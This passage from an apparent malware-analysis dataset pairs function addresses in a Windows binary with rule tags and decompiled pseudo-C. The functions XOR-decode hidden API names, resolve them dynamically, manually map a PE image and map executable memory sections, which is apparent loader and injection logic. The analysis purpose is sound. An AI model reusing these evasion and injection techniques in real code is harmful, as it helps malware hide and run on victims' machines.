var_2ch;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_28h + iVar8) ^ puVar1[&var_14h - var_1ch];\n        } while (iVar5 < 0x13);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, var_1ch);\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        iVar5 = (*pcVar4)(var_58h, 8, &hObject);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar5) {\n            var_48h._0_1_ = 6;\n            var_50h = 0x2239470b;\n            var_4ch = 0x79282b1f;\n            stack0xffffffb5 = 0x3c2b1531;\n            var_43h = 0x153e1c51;\n            var_3fh._0_1_ = 0x37;\n            var_3fh._1_1_ = 5;\n            stack0xffffffbf = 0x1432035f;\n            var_39h = 0x59;\n            var_8h = 0x57683051;\n            var_4h._0_1_ = 0x7a;\n            var_4h._1_1_ = 0x59;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = lpLibFileName;\n            iVar8 = 0;\n            var_28h = iVar5;\n            do {\n                puVar1 = iVar8 + iVar5;\n                iVar7 = iVar8 % var_2ch;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_50h - iVar5];\n            } while (iVar8 < 0x18);\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n            var_20h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            (*var_20h)(hObject, 1, 0, 0, &dwBytes);\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_2ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (var_2ch != NULL) {\n                iVar8 = (*var_20h)(hObject, 1, var_2ch, dwBytes, &dwBytes);\n                if (-1 < iVar8) {\n                    puVar9 = *var_2ch;\n                    puVar11 = var_60h;\n                    for (iVar5 = 0x1c; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar11 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                        puVar11 = puVar11 + 1;\n                    }\n                    var_5ch = 1;\n                    iVar5 = var_28h;\n                    iVar6 = lpLibFileName;\n                }\n                uVar3 = (*pcVar4)(0, var_2ch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar3 = (*pcVar4)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar5 = var_38h;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_58h);\n        uVar3 = (*pcVar4)(0, var_1ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    uVar3 = (*pcVar4)(0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar4)(0, iVar6);\n    (*pcVar2)(uVar3);\n    return var_5ch;\n}\n",
        "token_count": 2310
    },
    "00406346": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406346(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_2ch._0_2_ = 0x2e38;\n    var_2ch._2_1_ = 8;\n    var_10h = 5;\n    var_2ch._3_1_ = 5;\n    var_28h = 0x36324a04;\n    var_24h._0_2_ = 0x6900;\n    var_20h = 0x696c5a56;\n    var_1ch._0_2_ = 0x6468;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_2ch - lpModuleName;\n    do {\n        var_8h = 6;\n        puVar1 = iVar8 + lpModuleName;\n        iVar5 = iVar8 % 6;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_20h + iVar5) ^ puVar1[&var_2ch - lpModuleName];\n    } while (iVar8 < 10);\n    var_44h = 0x7c274121;\n    var_40h = 0x2a41201c;\n    var_3ch = 0x61001d46;\n    var_38h = 0x77624;\n    var_34h = 0x7403970;\n    var_30h._0_2_ = 0x3501;\n    var_8h = 0x324b3573;\n    var_4h._0_1_ = 0x68;\n    uVar2 = (*pcVar3)(8, 0x17);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = lpModuleName;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_10h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_44h - iVar5];\n    } while (iVar7 < 0x16);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*pcVar3)(var_18h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 876
    },
    "00406467": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406467(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x5082e38;\n    var_20h = 0x36324a04;\n    var_1ch._0_2_ = 0x6900;\n    var_18h = 0x696c5a56;\n    var_14h._0_2_ = 0x6468;\n    var_10h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 6;\n    iVar8 = 0;\n    var_8h = &var_24h - lpLibFileName;\n    do {\n        puVar1 = iVar8 + lpLibFileName;\n        iVar5 = iVar8 % 6;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_18h + iVar5) ^ puVar1[&var_24h - lpLibFileName];\n    } while (iVar8 < 10);\n    var_3ch = 0x5a02272b;\n    var_38h = 0x5155403;\n    var_34h = 0x7a19513e;\n    var_30h = 0x57320003;\n    var_2ch = 0x3d0a5c1a;\n    var_28h._0_1_ = 0x57;\n    var_18h = 0x34575365;\n    var_14h._0_2_ = 0x356e;\n    uVar2 = (*pcVar3)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = lpLibFileName;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_4h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_3ch - iVar5];\n    } while (iVar7 < 0x15);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    (*pcVar3)(0xffffffff, var_10h);\n    uVar2 = fcn.00406346();\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 867
    },
    "00406585": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406585(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x5082e38;\n    var_20h = 0x36324a04;\n    var_1ch._0_2_ = 0x6900;\n    var_18h = 0x696c5a56;\n    var_14h._0_2_ = 0x6468;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 6;\n    iVar8 = 0;\n    var_8h = &var_24h - lpModuleName;\n    do {\n        puVar1 = iVar8 + lpModuleName;\n        iVar5 = iVar8 % 6;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_18h + iVar5) ^ puVar1[&var_24h - lpModuleName];\n    } while (iVar8 < 10);\n    var_24h = 0x62273b11;\n    var_20h = 0x2027042a;\n    var_1ch._0_2_ = 0x3026;\n    var_18h = 0x304b4f43;\n    var_14h._0_2_ = 0x6a4b;\n    uVar2 = (*pcVar3)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = lpModuleName;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_4h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_24h - iVar5];\n    } while (iVar7 < 10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*pcVar3)(var_10h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 744
    },
    "00406687": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00406687(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_3ch;\n    uint var_38h;\n    ushort var_34h;\n    uint var_32h;\n    uint var_2eh;\n    uchar var_2ah;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    puVar9 = &var_28h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_3ch = 0xa7a123a;\n    var_4h = 6;\n    var_38h._0_1_ = 6;\n    var_38h._2_2_ = 0x31d;\n    var_34h = 0x2440;\n    var_32h._0_2_ = 0x310;\n    var_32h._2_2_ = 0x511;\n    var_2eh._0_2_ = 0x243;\n    var_2eh._2_2_ = 0x3e19;\n    var_2ah = 0x74;\n    var_20h = 0x6b376674;\n    var_1ch._0_2_ = 0x5076;\n    var_38h._1_1_ = var_38h;\n    var_14h = in_EDX;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    var_8h = &var_3ch - var_ch;\n    do {\n        puVar1 = iVar5 + var_ch;\n        iVar6 = iVar5 % var_4h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_20h + iVar6) ^ puVar1[&var_3ch - var_ch];\n    } while (iVar5 < 0x13);\n    var_34h = 0x2e38;\n    var_32h._0_2_ = 0x508;\n    var_32h._2_2_ = 0x4a04;\n    var_2eh._0_2_ = 0x3632;\n    var_2eh._2_2_ = 0x6900;\n    var_20h = 0x696c5a56;\n    var_1ch._0_2_ = 0x6468;\n    uVar2 = (*pcVar3)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = var_ch;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar6;\n        iVar7 = iVar8 % var_4h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_20h + iVar7) ^ puVar1[&var_34h - iVar6];\n    } while (iVar8 < 10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_ch);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    (*pcVar3)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar2 = fcn.00406346();\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 1073
    },
    "004067c9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004067c9(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1190
    },
    "00406924": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00406924(int32_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t lpModuleName;\n    uint var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_38h = 0x2e38;\n    puVar8 = &var_54h;\n    var_1ch = in_EDX;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar8 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar8 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_18h = 5;\n    var_8h = 0;\n    var_ch = NULL;\n    var_38h = CONCAT13(5, CONCAT12(8, var_38h));\n    var_34h = 0x36324a04;\n    var_30h = CONCAT22(var_30h._2_2_, 0x6900);\n    var_24h = 0x696c5a56;\n    var_20h._0_2_ = 0x6468;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    do {\n        var_10h = 6;\n        puVar1 = iVar5 + lpModuleName;\n        iVar6 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_38h - lpModuleName];\n    } while (iVar5 < 10);\n    var_3ch = 0x1f22461c;\n    var_38h = 0x446331c;\n    var_34h = 0x46311c3e;\n    var_30h = 0x52170208;\n    var_24h = 0x6d613252;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x79);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + iVar5;\n        iVar7 = iVar6 % var_18h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_3ch - iVar5];\n    } while (iVar6 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.00406346();\n    }\n    else {\n        iVar6 = fcn.00406687(&var_ch);\n        puVar9 = var_ch;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, lpModuleName);\n    (*pcVar4)(uVar3);\n    return iVar6;\n}\n",
        "token_count": 1355
    },
    "00406bf6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406bf6(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    code *pcVar10;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = *0x41ccc0;\n    iVar9 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar3 = fcn.00406aea(&var_8h);\n    if (iVar3 != 0) {\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrDupW)(uVar5);\n        var_14h = iVar4;\n        var_10h = fcn.0040e804();\n        iVar3 = iVar9;\n        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x425a6b5a;\n            var_28h = 0x330d7424;\n            var_24h._0_2_ = 0x4a42;\n            var_20h = 0x42336b74;\n            var_1ch._0_1_ = 0x4a;\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            iVar4 = var_14h;\n            iVar3 = var_18h;\n            do {\n                var_ch = 5;\n                puVar1 = iVar9 + piVar6;\n                iVar7 = iVar9 % 5;\n                iVar9 = iVar9 + 1;\n                *puVar1 = *(&var_20h + iVar7) ^ puVar1[&var_2ch - piVar6];\n            } while (iVar9 < 10);\n            piVar8 = piVar6;\n            do {\n                iVar2 = *piVar8;\n                *((var_10h - piVar6) + piVar8) = iVar2;\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar8 = piVar8 + 1;\n            } while (iVar2 != 0);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        iVar7 = fcn.0040d77b(var_8h);\n        iVar9 = iVar3;\n        if (iVar7 == 0) {\n            iVar3 = fcn.00406d1b();\n            if (iVar3 != 0) {\n                iVar9 = 1;\n            }\n        }\n        if (iVar4 != 0) {\n            uVar5 = (*pcVar10)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        uVar5 = (*pcVar10)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return iVar9;\n}\n",
        "token_count": 832
    },
    "00408151": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408151(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    code *pcVar3;\n    uchar *arg_8h_00;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int32_t *in_EDX;\n    int32_t iVar8;\n    int32_t *piVar9;\n    int32_t iVar10;\n    code *pcVar11;\n    int32_t iVar12;\n    uchar *puVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    uint32_t var_74h;\n    int32_t *var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    ushort var_25h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_68h = 0;\n    var_5ch = 0;\n    var_50h = 0;\n    var_54h = 5;\n    var_48h = 0x5082e38;\n    var_44h = 0x36324a04;\n    var_40h._0_2_ = 0x6900;\n    var_8h = 0x696c5a56;\n    var_4h._0_2_ = 0x6468;\n    var_70h = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    var_64h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar12 = 0;\n    var_60h = &var_48h - var_64h;\n    do {\n        var_10h = 0x6;\n        puVar1 = iVar12 + var_64h;\n        iVar8 = iVar12 % 6;\n        iVar12 = iVar12 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[var_60h];\n    } while (iVar12 < 10);\n    var_34h = 0x3b1f460a;\n    var_30h._0_2_ = 0x6642;\n    var_30h._2_1_ = 5;\n    stack0xffffffcf = 0x22502119;\n    var_29h._0_1_ = 0x48;\n    var_29h._1_1_ = 1;\n    var_29h._2_2_ = 0x533a;\n    var_25h = 0x433f;\n    var_23h._0_2_ = 0x3525;\n    var_23h._2_2_ = 0x3941;\n    var_1fh._0_2_ = 0x265e;\n    var_1fh._2_2_ = 0x4704;\n    var_1bh._0_2_ = 0x523f;\n    var_1bh._2_2_ = 0x272d;\n    var_17h._0_2_ = 0x6646;\n    var_17h._3_1_ = 0x48;\n    var_8h = 0x54483150;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n    var_17h._2_1_ = var_30h._2_1_;\n    uVar4 = (*pcVar11)(8, 0x22);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar12 = var_64h;\n    var_ch = NULL;\n    do {\n        piVar9 = var_ch + 1;\n        *(var_ch + iVar8) = *(&var_8h + var_ch % var_54h) ^ (var_ch + iVar8)[&var_34h - iVar8];\n        var_ch = piVar9;\n    } while (piVar9 < 0x21);\n    var_60h = iVar8;\n    if ((*0x41d1f4 & 1) == 0) {\n        *0x41d1f4 = *0x41d1f4 | 1;\n        *0x41d1f0 = 